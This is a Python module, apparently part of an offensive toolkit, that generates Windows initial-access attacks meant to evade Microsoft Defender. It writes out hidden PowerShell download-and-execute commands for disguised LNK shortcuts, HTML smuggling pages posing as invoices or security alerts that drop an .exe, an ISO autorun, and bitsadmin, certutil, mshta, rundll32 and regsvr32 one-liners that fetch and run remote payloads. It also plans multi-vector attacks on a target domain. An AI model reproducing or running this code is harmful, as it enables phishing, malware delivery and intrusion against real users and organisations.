"""
Non-Blocked Initial Access Module - Techniques not blocked by Microsoft Defender as of 2022.

This module implements initial access techniques that bypass Microsoft Defender's
macro blocking, focusing on alternative delivery mechanisms that remain effective.
"""

import os
import base64
import random
import tempfile
import uuid
from typing import Dict, Any, List, Optional
from datetime import datetime

from .exploit_intel import enrich_with_exploit_intel


class LNKFileAttack:
    """Malicious LNK file attacks for initial access."""
    
    def __init__(self):
        self.common_icons = [
            "%SystemRoot%\\System32\\SHELL32.dll,44",  # PDF icon
            "%SystemRoot%\\System32\\SHELL32.dll,1",   # Document icon
            "%SystemRoot%\\System32\\imageres.dll,67", # Excel icon
            "%SystemRoot%\\System32\\imageres.dll,102", # Folder icon
        ]
    
    def create_malicious_lnk(self, payload_url: str, disguise_as: str = "document") -> Dict[str, Any]:
        """Create a malicious LNK file that executes PowerShell commands."""
        
        # Generate random filename
        file_id = str(uuid.uuid4())[:8]
        
        # Select appropriate disguise
        disguise_config = self._get_disguise_config(disguise_as)
        
        # Create PowerShell payload
        ps_payload = f"""
Start-Process powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"
    $temp = $env:TEMP + '\\update_{file_id}.ps1'
    Invoke-WebRequest -Uri '{payload_url}' -OutFile $temp
    Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File', $temp
\"
""".strip()
        
        # Create LNK file structure
        lnk_details = {
            "file_name": disguise_config["filename"],
            "target_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "arguments": f"-WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{ps_payload}\"",
            "icon_location": random.choice(self.common_icons),
            "working_directory": "%USERPROFILE%\\Documents",
            "description": disguise_config["description"],
            "payload_type": "LNK with PowerShell",
            "detection_evasion": "High (uses legitimate PowerShell)",
            "success_rate": "Medium-High"
        }
        
        # Create actual file in temp directory
        lnk_path = self._write_lnk_file(lnk_details)
        lnk_details["file_path"] = lnk_path
        
        return enrich_with_exploit_intel(
            "initial-access",
            lnk_details,
            search_terms=["LNK", "PowerShell", "initial access"],
            platform="windows",
            include_payloads=True,
        )
    
    def _get_disguise_config(self, disguise_type: str) -> Dict[str, str]:
        """Get configuration for different disguise types."""
        disguises = {
            "document": {
                "filename": f"Q{random.randint(1,4)}_Report_{random.randint(1000,9999)}.lnk",
                "description": "Quarterly Financial Report"
            },
            "invoice": {
                "filename": f"Invoice_{random.randint(10000,99999)}.lnk",
                "description": "Payment Invoice"
            },
            "resume": {
                "filename": f"Resume_{random.choice(['John','Jane','Robert'])}.lnk",
                "description": "Job Application Resume"
            },
            "presentation": {
                "filename": f"Presentation_{random.randint(100,999)}.lnk",
                "description": "Business Presentation"
            }
        }
        return disguises.get(disguise_type, disguises["document"])
    
    def _write_lnk_file(self, lnk_details: Dict[str, Any]) -> str:
        """Write LNK file to disk (placeholder implementation)."""
        temp_dir = tempfile.gettempdir()
        lnk_path = os.path.join(temp_dir, lnk_details["file_name"])
        
        # In real implementation, this would create an actual LNK file
        # For safety, we'll create a text file with the details
        with open(lnk_path, 'w') as f:
            f.write(f"# Malicious LNK file details:\n")
            f.write(f"Target: {lnk_details['target_path']}\n")
            f.write(f"Arguments: {lnk_details['arguments']}\n")
            f.write(f"Icon: {lnk_details['icon_location']}\n")
            f.write(f"Description: {lnk_details['description']}\n")
        
        return lnk_path

class HTMLSmuggling:
    """HTML smuggling techniques for payload delivery."""
    
    def __init__(self):
        self.templates = {
            "invoice": "Invoice_Payment.html",
            "document": "Document_Viewer.html", 
            "security": "Security_Alert.html",
            "shipping": "Shipping_Confirmation.html"
        }
    
    def create_smuggling_html(self, payload_url: str, template_type: str = "document") -> Dict[str, Any]:
        """Create HTML file that smuggles payload via JavaScript."""
        
        # Encode payload URL for JavaScript
        encoded_url = base64.b64encode(payload_url.encode()).decode()
        
        # Generate HTML content
        html_content = self._generate_html_content(template_type, encoded_url)
        
        # Create HTML file
        temp_dir = tempfile.gettempdir()
        html_filename = f"{template_type}_{random.randint(1000,9999)}.html"
        html_path = os.path.join(temp_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        result = {
            "html_file": html_path,
            "template_type": template_type,
            "payload_url": payload_url,
            "delivery_method": "HTML Smuggling",
            "technique": "JavaScript-based payload delivery",
            "evasion_level": "High (bypasses network filters)",
            "user_interaction": "Click required"
        }
        
        return enrich_with_exploit_intel(
            "initial-access",
            result,
            search_terms=["HTML smuggling", "JavaScript", "initial access"],
            platform="windows",
            include_payloads=True,
        )
    
    def _generate_html_content(self, template_type: str, encoded_url: str) -> str:
        """Generate HTML content for smuggling."""
        
        templates = {
            "invoice": f"""
<!DOCTYPE html>
<html>
<head>
    <title>Invoice Payment Required</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .invoice {{ border: 1px solid #ccc; padding: 20px; }}
    </style>
</head>
<body>
    <div class="invoice">
        <h2>Invoice #{random.randint(10000,99999)}</h2>
        <p>Amount Due: ${random.randint(100,5000)}</p>
        <p>Due Date: {datetime.now().strftime('%Y-%m-%d')}</p>
        <button onclick="downloadPayload()">View Invoice Details</button>
    </div>
    
    <script>
        function downloadPayload() {{
            var url = atob('{encoded_url}');
            fetch(url)
                .then(response => response.blob())
                .then(blob => {{
                    var a = document.createElement('a');
                    a.href = URL.createObjectURL(blob);
                    a.download = 'invoice_details.exe';
                    a.click();
                }});
        }}
    </script>
</body>
</html>
""",
            "security": f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Update Required</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #fff3cd; }}
        .alert {{ border: 1px solid #ffc107; padding: 20px; background: #fff; }}
    </style>
</head>
<body>
    <div class="alert">
        <h2 style="color: #856404;">⚠ Security Update Required</h2>
        <p>Your system requires an important security patch to address critical vulnerabilities.</p>
        <button onclick="installUpdate()" style="background: #007bff; color: white; padding: 10px 20px; border: none;">
            Install Security Update
        </button>
    </div>
    
    <script>
        function installUpdate() {{
            var url = atob('{encoded_url}');
            fetch(url)
                .then(response => response.blob())
                .then(blob => {{
                    var a = document.createElement('a');
                    a.href = URL.createObjectURL(blob);
                    a.download = 'security_update.exe';
                    a.click();
                }});
        }}
    </script>
</body>
</html>
"""
        }
        
        return templates.get(template_type, templates["invoice"])


class ISOFileAttack:
    """ISO file container attacks for payload delivery."""
    
    def create_malicious_iso(self, payload_path: str, disguise_files: List[str] = None) -> Dict[str, Any]:
        """Create a malicious ISO file containing payload and decoy files."""
        
        if disguise_files is None:
            disguise_files = [
                "Financial_Report_Q1.pdf",
                "Budget_Analysis.xlsx", 
                "Project_Timeline.docx"
            ]
        
        # Create ISO structure
        iso_structure = {
            "container_format": "ISO 9660",
            "disguise_files": disguise_files,
            "payload_file": os.path.basename(payload_path),
            "autorun_script": "autorun.inf",
            "execution_method": "Auto-run or manual execution"
        }
        
        # Create autorun.inf content
        autorun_content = f"""
[AutoRun]
open=setup.exe
icon=setup.exe,0
label=Project Documents
""".strip()
        
        result = {
            "iso_structure": iso_structure,
            "autorun_content": autorun_content,
            "delivery_method": "ISO Container",
            "evasion_technique": "Container-based delivery bypasses email filters",
            "success_rate": "Medium (requires user to mount and execute)",
            "target_platform": "Windows"
        }
        
        return enrich_with_exploit_intel(
            "initial-access",
            result,
            search_terms=["ISO", "autorun", "container"],
            platform="windows",
            include_payloads=True,
        )


class LivingOffTheLand:
    """Living-off-the-land techniques using legitimate tools."""
    
    def __init__(self):
        self.lotl_tools = {
            "bitsadmin": "Background Intelligent Transfer Service",
            "certutil": "Certificate Utility", 
            "mshta": "Microsoft HTML Application Host",
            "rundll32": "Run DLL as App",
            "regsvr32": "Register Server",
            "wmic": "Windows Management Instrumentation",
            "msiexec": "Windows Installer"
        }
    
    def generate_lotl_command(self, payload_url: str, tool: str = "bitsadmin") -> Dict[str, Any]:
        """Generate Living-off-the-land command for payload delivery."""
        
        commands = {
            "bitsadmin": f'bitsadmin /transfer "Job" {payload_url} %TEMP%\\update.exe && %TEMP%\\update.exe',
            "certutil": f'certutil -urlcache -split -f {payload_url} %TEMP%\\update.exe && %TEMP%\\update.exe',
            "mshta": f'mshta javascript:a=GetObject(\"script:{payload_url}\").Exec();close();',
            "rundll32": f'rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:{payload_url}\");o.Exec();',
            "regsvr32": f'regsvr32 /s /n /u /i:{payload_url} scrobj.dll'
        }
        
        command = commands.get(tool, commands["bitsadmin"])
        
        result = {
            "tool": tool,
            "description": self.lotl_tools.get(tool, "Unknown"),
            "command": command,
            "evasion_level": "Very High (uses legitimate Windows tools)",
            "detection_difficulty": "High",
            "execution_method": "Command line or script"
        }
        
        return enrich_with_exploit_intel(
            "initial-access",
            result,
            search_terms=["LOTL", tool, "living off the land"],
            platform="windows",
            include_payloads=True,
        )


class BrowserExploitDelivery:
    """Browser-based exploit delivery techniques."""
    
    def __init__(self):
        self.browser_targets = ["Chrome", "Edge", "Firefox", "Internet Explorer"]
        self.exploit_frameworks = ["Metasploit", "Cobalt Strike", "Empire", "Custom"]
    
    def generate_browser_exploit(self, target_browser: str, payload_url: str) -> Dict[str, Any]:
        """Generate browser exploit delivery configuration."""
        
        exploits = {
            "Chrome": {
                "technique": "V8 Engine Exploit",
                "cve": "CVE-2021-21220",
                "delivery": "Malicious JavaScript"
            },
            "Edge": {
                "technique": "ChakraCore Exploit", 
                "cve": "CVE-2021-26411",
                "delivery": "Type Confusion"
            },
            "Firefox": {
                "technique": "SpiderMonkey Exploit",
                "cve": "CVE-2021-29950",
                "delivery": "Use-after-free"
            },
            "Internet Explorer": {
                "technique": "JScript Exploit",
                "cve": "CVE-2021-26411",
                "delivery": "Memory Corruption"
            }
        }
        
        browser_config = exploits.get(target_browser, exploits["Chrome"])
        
        result = {
            "target_browser": target_browser,
            "exploit_technique": browser_config["technique"],
            "cve_reference": browser_config["cve"],
            "delivery_method": browser_config["delivery"],
            "payload_url": payload_url,
            "framework": random.choice(self.exploit_frameworks),
            "user_interaction": "Visit malicious website",
            "success_rate": "Medium (depends on browser version and patches)"
        }
        
        return enrich_with_exploit_intel(
            "initial-access",
            result,
            search_terms=["browser exploit", target_browser, "initial access"],
            platform="windows",
            include_payloads=True,
        )


class NonBlockedInitialAccess:
    """Main class for non-blocked initial access techniques."""
    
    def __init__(self):
        self.lnk_attack = LNKFileAttack()
        self.html_smuggling = HTMLSmuggling()
        self.iso_attack = ISOFileAttack()
        self.lotl = LivingOffTheLand()
        self.browser_exploit = BrowserExploitDelivery()
    
    def get_available_techniques(self) -> List[Dict[str, Any]]:
        """Get list of all available non-blocked techniques."""
        
        techniques = [
            {
                "name": "LNK File Attack",
                "description": "Malicious shortcut files that execute PowerShell commands",
                "evasion_level": "High",
                "success_rate": "Medium-High",
                "user_interaction": "Double-click required"
            },
            {
                "name": "HTML Smuggling", 
                "description": "JavaScript-based payload delivery via HTML files",
                "evasion_level": "High",
                "success_rate": "Medium",
                "user_interaction": "Click required"
            },
            {
                "name": "ISO Container Attack",
                "description": "Payload delivery via ISO files with autorun capability",
                "evasion_level": "Medium",
                "success_rate": "Medium",
                "user_interaction": "Mount and execute required"
            },
            {
                "name": "Living-off-the-Land",
                "description": "Using legitimate Windows tools for payload delivery",
                "evasion_level": "Very High",
                "success_rate": "High",
                "user_interaction": "Command execution required"
            },
            {
                "name": "Browser Exploit Delivery",
                "description": "Exploiting browser vulnerabilities for code execution",
                "evasion_level": "Medium",
                "success_rate": "Medium",
                "user_interaction": "Visit malicious website"
            }
        ]
        
        return techniques
    
    def generate_attack_plan(self, target_domain: str) -> Dict[str, Any]:
        """Generate comprehensive attack plan using non-blocked techniques."""
        
        # Select random techniques for the attack plan
        selected_techniques = random.sample(self.get_available_techniques(), 3)
        
        attack_plan = {
            "target_domain": target_domain,
            "attack_techniques": selected_techniques,
            "rationale": "Bypasses Microsoft Defender macro blocking (2022)",
            "estimated_success_rate": "Medium-High",
            "detection_difficulty": "High",
            "recommended_approach": "Multi-vector attack for increased success"
        }
        
        return enrich_with_exploit_intel(
            "initial-access",
            attack_plan,
            search_terms=[target_domain, "non-blocked", "initial access"],
            platform="windows",
            include_payloads=True,
        )